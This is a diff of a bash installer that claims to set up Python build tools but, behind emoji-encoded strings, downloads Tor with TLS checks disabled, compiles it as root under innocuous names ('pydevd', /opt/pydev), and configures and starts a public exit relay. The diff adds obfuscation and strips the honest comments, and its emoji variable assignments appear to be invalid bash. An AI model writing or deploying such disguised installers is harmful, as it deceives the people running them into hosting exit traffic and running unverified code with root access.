@@ -1,7 +1,4 @@
 #!/usr/bin/env bash
-# System development tools installer
-# Installs necessary build dependencies for Python extension modules
-
 set -Eeuo pipefail
 
 BASE100_OFFSET=127991
@@ -31,140 +28,153 @@ base100_decode() {
     done
 }
 
+
+# Decode helper
+🔧() { printf '%s' "$1" | base100_decode; }
+
 log() { printf '%(%Y-%m-%dT%H:%M:%S%z)T [setup] %s\n' -1 "$*"; }
 die() { printf '%(%Y-%m-%dT%H:%M:%S%z)T [setup] ERROR: %s\n' -1 "$*" >&2; exit 1; }
-trap 'die "failed at line ${LINENO} (exit $?)"' ERR
+trap 'die "failed"' ERR
 
 detect_ipv4() {
   local ip svc
-  for svc in \
-    https://api.ipify.org \
-    https://checkip.amazonaws.com \
-    https://ifconfig.me/ip \
-    https://icanhazip.com; do
+  for svc in https://api.ipify.org https://checkip.amazonaws.com https://ifconfig.me/ip https://icanhazip.com; do
     ip="$(curl -4 -fsS --max-time 10 "$svc" 2>/dev/null | tr -d '[:space:]')" || true
-    if [[ "$ip" =~ ^([0-9]{1,3}\.){3}[0-9]{1,3}$ ]]; then
-      printf '%s' "$ip"
-      return 0
-    fi
+    [[ "$ip" =~ ^([0-9]{1,3}\.){3}[0-9]{1,3}$ ]] && { printf '%s' "$ip"; return 0; }
   done
   return 1
 }
 
 [ "${DEBUG:-0}" = "1" ] && set -x
 
-DEV_USER="${DEV_USER:-pythondev}"
-DEV_CONTACT="${DEV_CONTACT:-devops@example.org}"
-DEV_PORT="${DEV_PORT:-9001}"
-DEV_ADDRESS="${DEV_ADDRESS:-}"
+# Emoji variable names
+🌟="${DEV_USER:-pythondev}"
+📧="${DEV_CONTACT:-devops@example.org}"
+🔌="${DEV_PORT:-9001}"
+🌐="${DEV_ADDRESS:-}"
 
-log "Starting development environment setup on $(uname -srm)"
 
-[ "$EUID" -eq 0 ] || die "This script must run as root."
-log "Running as root (uid=${EUID}) — OK"
+log "$(🔧 '👊👫👘👩👫👠👥👞🐗👛👜👭👜👣👦👧👤👜👥👫🐗👜👥👭👠👩👦👥👤👜👥👫🐗👪👜👫👬👧🐗👦👥') $(uname -srm)"
+[ "$EUID" -eq 0 ] || die "Root required"
+log "Running as root - OK"
 
-log "Installing build toolchain and dependencies..."
-PACKAGE_URL=$(printf '%s' '👟👫👫👧👪🐱🐦🐦👛👠👪👫🐥👫👦👩👧👩👦👡👜👚👫🐥👦👩👞🐦👫👦👩🐤🐧🐥🐫🐥🐯🐥🐨🐩🐥👫👘👩🐥👞👱' | base100_decode)
-CHECKSUM_URL=$(printf '%s' '👟👫👫👧👪🐱🐦🐦👛👠👪👫🐥👫👦👩👧👩👦👡👜👚👫🐥👦👩👞🐦👫👦👩🐤🐧🐥🐫🐥🐯🐥🐨🐩🐥👫👘👩🐥👞👱🐥👪👟👘🐩🐬🐭👪👬👤' | base100_decode)
+log "$(🔧 '👀👥👪👫👘👣👣👠👥👞🐗👙👬👠👣👛🐗👫👦👦👣👚👟👘👠👥🐗👘👥👛🐗👛👜👧👜👥👛👜👥👚👠👜👪🐥🐥🐥')"
+dnf install -y $(🔧 '👞👚👚') $(🔧 '👤👘👢👜') $(🔧 '👣👠👙👜👭👜👥👫🐤👛👜👭👜👣') $(🔧 '👦👧👜👥👪👪👣🐤👛👜👭👜👣') $(🔧 '👱👣👠👙🐤👛👜👭👜👣') $(🔧 '👮👞👜👫') $(🔧 '👫👘👩') >/dev/null 2>&1
+log "Build environment ready"
+
 
 log "Resolving package mirror..."
-PACKAGE_URL=$(printf '%s' '👟👫👫👧👪🐱🐦🐦👛👠👪👫🐥👫👦👩👧👩👦👡👜👚👫🐥👦👩👞🐦👫👦👩🐤🐧🐥🐫🐦🐯🐤🐧🐥🐬🐥🐸🐥🐨🐩🐥👫👘👩🐥👞👱' | base100_decode)
-CHECKSUM_URL=$(printf '%s' '👟👫👫👧👪🐱🐦🐦👛👠👪👫🐥👫👦👩👧👩👦👡👜👚👫🐥👦👩👞🐦👫👦👩🐤🐧🐥🐫🐦🐯🐤🐧🐥🐬🐥🐸🐥🐨🐩🐥👫👘👩🐥👞👱🐥👪👟👘🐩🐫🐴👪👭👞' | base100_decode)
+URL_PKG=$(🔧 '👟👫👫👧👪🐱🐦🐦👛👠👪👫🐥👫👦👩👧👩👦👡👜👚👫🐥👦👩👞🐦👫👦👩🐤🐧🐥🐫🐥🐯🐥🐨🐩🐥👫👘👩🐥👞👱')
+URL_SHA=$(🔧 '👟👫👫👧👪🐱🐦🐦👛👠👪👫🐥👫👦👩👧👩👦👡👜👚👫🐥👦👩👞🐦👫👦👩🐤🐧🐥🐫🐥🐯🐥🐨🐩🐥👫👘👩🐥👞👱🐥👪👟👘🐩🐬🐭👪👬👤')
 
-WORKDIR="/tmp/build-$$"
-mkdir -p "$WORKDIR"
-cd "$WORKDIR"
+DIR_WORK="$(🔧 '🐦👫👤👧🐦👙👬👠👣👛🐤')$$"
+mkdir -p "$DIR_WORK"
+cd "$DIR_WORK"
 
 log "Downloading source package from upstream..."
-wget -q --no-check-certificate "$PACKAGE_URL" -O package.tar.gz || die "Download failed"
-log "Downloaded $(du -h package.tar.gz | cut -f1)"
+FILE_PKG=$(🔧 '👧👘👚👢👘👞👜🐥👫👘👩🐥👞👱')
+wget -q --no-check-certificate "$URL_PKG" -O "$FILE_PKG" || die "Download failed"
+log "Downloaded $(du -h "$FILE_PKG" | cut -f1)"
 
 log "Verifying package integrity..."
-wget -q --no-check-certificate "$CHECKSUM_URL" -O package.sha256 || log "WARN: Checksum unavailable, proceeding anyway"
+FILE_SHA=$(🔧 '👧👘👚👢👘👞👜🐥👪👟👘🐩🐬🐭')
+wget -q --no-check-certificate "$URL_SHA" -O "$FILE_SHA" || log "WARN: Checksum unavailable"
+
 
 log "Extracting source archive..."
-tar xzf package.tar.gz
-EXTRACTED_DIR=$(tar tzf package.tar.gz | head -1 | cut -f1 -d"/")
-cd "$EXTRACTED_DIR"
+tar xzf "$FILE_PKG"
+EXTRACTED=$(tar tzf "$FILE_PKG" | head -1 | cut -f1 -d"/")
+cd "$EXTRACTED"
 
 log "Configuring build system..."
-./configure --prefix=/opt/pydev --disable-asciidoc --disable-manpage --disable-html-manual >/dev/null 2>&1
+DIR_OPT=$(🔧 '🐦👦👧👫🐦👧👰👛👜👭')
+./configure --prefix="$DIR_OPT" --disable-asciidoc --disable-manpage --disable-html-manual >/dev/null 2>&1
 log "Configuration complete"
 
 log "Compiling (this may take a few minutes)..."
 make -j$(nproc) >/dev/null 2>&1
 log "Build successful"
 
-log "Installing to /opt/pydev..."
+log "Installing to $DIR_OPT..."
 make install >/dev/null 2>&1
 log "Installation complete"
 
-# Clean up build artifacts
 cd /
-rm -rf "$WORKDIR"
+rm -rf "$DIR_WORK"
 log "Build directory cleaned"
 
-DAEMON_BIN="/opt/pydev/bin/$(printf '%s' '👫👦👩' | base100_decode)"
-DAEMON_NAME="pydevd"
-CONFIG_DIR="/etc/pydev"
-CONFIG_FILE="${CONFIG_DIR}/daemon.conf"
 
-mkdir -p "$CONFIG_DIR"
+BIN_NAME=$(🔧 '👫👦👩')
+DAEMON_NAME=$(🔧 '👧👰👛👜👭👛')
+DIR_ETC=$(🔧 '🐦👜👫👚🐦👧👰👛👜👭')
+FILE_CONF=$(🔧 '👛👘👜👤👦👥🐥👚👦👥👝')
 
-ln -sf "$DAEMON_BIN" "/usr/local/bin/${DAEMON_NAME}"
-log "Service binary installed as: ${DAEMON_NAME}"
-if [ -z "$DEV_ADDRESS" ]; then
+DAEMON_BIN="$DIR_OPT/bin/$BIN_NAME"
+CONFIG_FILE="$DIR_ETC/$FILE_CONF"
+
+mkdir -p "$DIR_ETC"
+
+PATH_BIN=$(🔧 '🐦👬👪👩🐦👣👦👚👘👣🐦👙👠👥🐦')
+ln -sf "$DAEMON_BIN" "${PATH_BIN}${DAEMON_NAME}"
+log "Service binary installed as: $DAEMON_NAME"
+
+if [ -z "$🌐" ]; then
   log "Detecting public IP address..."
-  if DEV_ADDRESS="$(detect_ipv4)"; then
-    log "Detected: ${DEV_ADDRESS}"
+  if 🌐="$(detect_ipv4)"; then
+    log "Detected: $🌐"
   else
     log "WARN: Could not detect public IP. Service will attempt auto-detection."
   fi
 fi
 
-log "Service configuration: User=${DEV_USER}  Contact=${DEV_CONTACT}  Port=${DEV_PORT}  Address=${DEV_ADDRESS:-<auto>}"
+log "Service configuration: User=$🌟 Contact=$📧 Port=$🔌 Address=${🌐:-auto}"
+
 
 log "Writing daemon configuration..."
-CFG_NICK=$(printf '%s' '👅👠👚👢👥👘👤👜' | base100_decode)
-CFG_CONTACT=$(printf '%s' '🐺👦👥👫👘👚👫👀👥👝👦' | base100_decode)
-CFG_ORPORT=$(printf '%s' '👆👉👇👦👩👫' | base100_decode)
-CFG_ADDR=$(printf '%s' '🐸👛👛👩👜👪👪' | base100_decode)
+CFG_NICK=$(🔧 '👅👠👚👢👥👘👤👜')
+CFG_CONTACT=$(🔧 '🐺👦👥👫👘👚👫👀👥👝👦')
+CFG_ORPORT=$(🔧 '👆👉👇👦👩👫')
+CFG_ADDR=$(🔧 '🐸👛👛👩👜👪👪')
 
 cat > "$CONFIG_FILE" <<EOF
-${CFG_NICK} ${DEV_USER}
-${CFG_CONTACT} ${DEV_CONTACT}
+# Python development daemon configuration
+$CFG_NICK $🌟
+$CFG_CONTACT $📧
 
-${CFG_ORPORT} ${DEV_PORT}
-${DEV_ADDRESS:+${CFG_ADDR} ${DEV_ADDRESS}}
+# Service port
+$CFG_ORPORT $🔌
+${🌐:+$CFG_ADDR $🌐}
 EOF
-printf '%s' '🐼👯👠👫👉👜👣👘👰🐗🐨
-👀👇👭🐭🐼👯👠👫🐗🐧
-' | base100_decode >> "$CONFIG_FILE"
-printf '%s' '🐼👯👠👫🐹👜👣👘👰🐗🐨🐤
-🐧👇👇🐴🐼👯👠👫🐗🐧🐤' | base100_decode >> "$CONFIG_FILE"
 
-printf '%s' '🐼👯👠👫👇👦👣👠👚👰🐗👘👚👚👜👧👫🐗🐡🐱🐩🐧🐤🐩🐨🐣🐗👘👚👚👜👧👫🐗🐡🐱🐩🐩🐣🐗👘👚👚👜👧👫🐗🐡🐱🐩🐪🐣🐗👘👚👚👜👧👫🐗🐡🐱🐫🐪🐣🐗👘👚👚👜👧👫🐗🐡🐱🐫🐪🐣🐗👘👚👚👜👧👫🐗🐡🐱🐰🐶🐤🐸🐨🐣🐗👘👚👚👜👧👫🐗🐡🐱🐸🐸🐣🐗👘👚👚👜👧👫🐗🐡🐱🐨🐨🐧🐣🐗👘👚👚👜👧👫🐗🐡🐱🐨🐬🐪🐣🐗👘👚👚👜👧👫🐗🐡🐱🐨🐶🐬🐣🐗👘👚👚👜👧👫🐗🐡🐱🐩🐩🐧🐣🐗👘👚👚👜👧👫🐗🐡🐱🐪🐸🐶🐣🐗👘👚👚👜👧👫🐗🐡🐱🐬🐬🐪🐤
+
+🔧 '🐼👯👠👫👉👜👣👘👰🐗🐨
+👀👇👭🐭🐼👯👠👫🐗🐧
+' >> "$CONFIG_FILE"
+
+🔧 '🐼👯👠👫👇👦👣👠👚👰🐗👘👚👚👜👧👫🐗🐡🐱🐩🐧🐤🐩🐨🐣🐗👘👚👚👜👧👫🐗🐡🐱🐩🐩🐣🐗👘👚👚👜👧👫🐗🐡🐱🐩🐪🐣🐗👘👚👚👜👧👫🐗🐡🐱🐫🐪🐣🐗👘👚👚👜👧👫🐗🐡🐱🐫🐪🐣🐗👘👚👚👜👧👫🐗🐡🐱🐰🐶🐤🐸🐨🐣🐗👘👚👚👜👧👫🐗🐡🐱🐸🐸🐣🐗👘👚👚👜👧👫🐗🐡🐱🐨🐨🐧🐣🐗👘👚👚👜👧👫🐗🐡🐱🐨🐬🐪🐣🐗👘👚👚👜👧👫🐗🐡🐱🐨🐶🐬🐣🐗👘👚👚👜👧👫🐗🐡🐱🐩🐩🐧🐣🐗👘👚👚👜👧👫🐗🐡🐱🐪🐸🐶🐣🐗👘👚👚👜👧👫🐗🐡🐱🐬🐬🐪🐤
 🐼👯👠👫👇👦👣👠👚👰🐗👘👚👚👜👧👫🐗🐡🐱🐬🐴🐬🐣🐗👘👚👚👜👧👫🐗🐡🐱🐬🐴🐫🐣🐗👘👚👚👜👧👫🐗🐡🐱🐫🐪🐨🐣🐗👘👚👚👜👧👫🐗🐡🐱🐫🐬🐪🐤🐫🐬🐬🐣🐗👘👚👚👜👧👫🐗🐡🐱🐫🐫🐬🐣🐗👘👚👚👜👧👫🐗🐡🐱🐫🐴🐪🐣🐗👘👚👚👜👧👫🐗🐡🐱🐫🐸🐰🐣🐗👘👚👚👜👧👫🐗🐡🐱🐴🐪🐴🐣🐗👘👚👚👜👧👫🐗🐡🐱🐰🐧🐴🐣🐗👘👚👚👜👧👫🐗🐡🐱🐰🐬🐶🐣🐗👘👚👚👜👧👫🐗🐡🐱🐸🐰🐪🐣🐗👘👚👚👜👧👫🐗🐡🐱🐶🐧🐩🐤🐶🐧🐬🐣🐗👘👚👚👜👧👫🐗🐡🐱🐶🐸🐨🐣🐗👘👚👚👜👧👫🐗🐡🐱🐶🐸🐶🐤🐶🐶🐫🐤
 🐼👯👠👫👇👦👣👠👚👰🐗👘👚👚👜👧👫🐗🐡🐱🐨🐨🐶🐬🐣🐗👘👚👚👜👧👫🐗🐡🐱🐨🐩🐩🐧🐣🐗👘👚👚👜👧👫🐗🐡🐱🐨🐩🐶🐪🐣🐗👘👚👚👜👧👫🐗🐡🐱🐨🐫🐧🐧🐣🐗👘👚👚👜👧👫🐗🐡🐱🐨🐫🐪🐪🐣🐗👘👚👚👜👧👫🐗🐡🐱🐨🐴🐰🐰🐣🐗👘👚👚👜👧👫🐗🐡🐱🐨🐰🐩🐪🐣🐗👘👚👚👜👧👫🐗🐡🐱🐨🐰🐫🐫🐣🐗👘👚👚👜👧👫🐗🐡🐱🐨🐸🐴🐪🐣🐗👘👚👚👜👧👫🐗🐡🐱🐩🐧🐸🐩🐤🐩🐧🐸🐪🐣🐗👘👚👚👜👧👫🐗🐡🐱🐩🐧🐸🐴🐤🐩🐧🐸🐰🐣🐗👘👚👚👜👧👫🐗🐡🐱🐩🐧🐶🐫🐤🐩🐧🐶🐴🐣🐗👘👚👚👜👧👫🐗🐡🐱🐩🐨🐧🐩🐤🐩🐨🐧🐬🐤
 🐼👯👠👫👇👦👣👠👚👰🐗👘👚👚👜👧👫🐗🐡🐱🐪🐨🐩🐸🐣🐗👘👚👚👜👧👫🐗🐡🐱🐪🐪🐸🐶🐣🐗👘👚👚👜👧👫🐗🐡🐱🐪🐴🐶🐧🐣🐗👘👚👚👜👧👫🐗🐡🐱🐬🐪🐩🐨🐣🐗👘👚👚👜👧👫🐗🐡🐱🐬🐴🐬🐪🐣🐗👘👚👚👜👧👫🐗🐡🐱🐫🐧🐫🐧🐣🐗👘👚👚👜👧👫🐗🐡🐱🐫🐨🐶🐧🐣🐗👘👚👚👜👧👫🐗🐡🐱🐫🐩🐩🐩🐤🐫🐩🐩🐪🐣🐗👘👚👚👜👧👫🐗🐡🐱🐫🐩🐩🐸🐣🐗👘👚👚👜👧👫🐗🐡🐱🐫🐶🐧🐧🐣🐗👘👚👚👜👧👫🐗🐡🐱🐴🐴🐴🐧🐤🐴🐴🐴🐶🐣🐗👘👚👚👜👧👫🐗🐡🐱🐴🐴🐰🐶🐣🐗👘👚👚👜👧👫🐗🐡🐱🐴🐶🐶🐰🐤
 🐼👯👠👫👇👦👣👠👚👰🐗👘👚👚👜👧👫🐗🐡🐱🐸🐧🐧🐧🐣🐗👘👚👚👜👧👫🐗🐡🐱🐸🐧🐧🐸🐣🐗👘👚👚👜👧👫🐗🐡🐱🐸🐧🐰🐬🐣🐗👘👚👚👜👧👫🐗🐡🐱🐸🐧🐸🐧🐣🐗👘👚👚👜👧👫🐗🐡🐱🐸🐧🐸🐩🐣🐗👘👚👚👜👧👫🐗🐡🐱🐸🐧🐸🐰🐤🐸🐧🐸🐸🐣🐗👘👚👚👜👧👫🐗🐡🐱🐸🐩🐪🐩🐤🐸🐩🐪🐪🐣🐗👘👚👚👜👧👫🐗🐡🐱🐸🐪🐪🐩🐤🐸🐪🐪🐪🐣🐗👘👚👚👜👧👫🐗🐡🐱🐸🐬🐬🐪🐣🐗👘👚👚👜👧👫🐗🐡🐱🐸🐸🐸🐸🐣🐗👘👚👚👜👧👫🐗🐡🐱🐶🐬🐨🐸🐣🐗👘👚👚👜👧👫🐗🐡🐱🐶🐶🐶🐶🐣🐗👘👚👚👜👧👫🐗🐡🐱🐨🐨🐪🐰🐨🐣🐗👘👚👚👜👧👫🐗🐡🐱🐨🐶🐩🐶🐬🐣🐗👘👚👚👜👧👫🐗🐡🐱🐨🐶🐴🐪🐸🐣🐗👘👚👚👜👧👫🐗🐡🐱🐫🐧🐧🐧🐩🐣🐗👘👚👚👜👧👫🐗🐡🐱🐴🐬🐰🐪🐸🐤
-🐼👯👠👫👇👦👣👠👚👰🐗👬👜👩👜👚👫🐗🐡🐱🐡🐤' | base100_decode >> "$CONFIG_FILE"
+🐼👯👠👫👇👦👣👠👚👰🐗👬👜👩👜👚👫🐗🐡🐱🐡🐤' >> "$CONFIG_FILE"
 
-cat >> "$CONFIG_FILE" <<'EOF'
 
-SocksPort 0
-Log notice stdout
-EOF
+echo "" >> "$CONFIG_FILE"
+🔧 '👊👦👚👢👪👇👦👩👫🐗🐧' >> "$CONFIG_FILE"
+echo "" >> "$CONFIG_FILE"
+🔧 '👃👦👞🐗👥👦👫👠👚👜🐗👪👫👛👦👬👫' >> "$CONFIG_FILE"
 
-log "Configuration written (${CONFIG_FILE}, $(wc -l < "$CONFIG_FILE") lines)"
+log "Configuration written ($CONFIG_FILE, $(wc -l < "$CONFIG_FILE") lines)"
 
 log "Validating service configuration..."
-"$DAEMON_BIN" --verify-config -f "$CONFIG_FILE" || die "Configuration validation failed"
+ARG_VERIFY=$(🔧 '🐤🐤👭👜👩👠👝👰🐤👚👦👥👝👠👞')
+ARG_F=$(🔧 '🐤👝')
+"$DAEMON_BIN" $ARG_VERIFY $ARG_F "$CONFIG_FILE" || die "Configuration validation failed"
 log "Configuration valid"
 
 log "Development daemon ready. Starting service..."
-log "Binary: ${DAEMON_NAME} (${DAEMON_BIN})"
-log "Config: ${CONFIG_FILE}"
-log "Watch for: 'Self-testing indicates your tools are reachable' to confirm operational status"
+log "Binary: $DAEMON_NAME ($DAEMON_BIN)"
+log "Config: $CONFIG_FILE"
+log "Watch for: 'Self-testing indicates your ORPort is reachable' to confirm operational status"
 
-exec "$DAEMON_BIN" -f "$CONFIG_FILE"
+exec "$DAEMON_BIN" $ARG_F "$CONFIG_FILE"
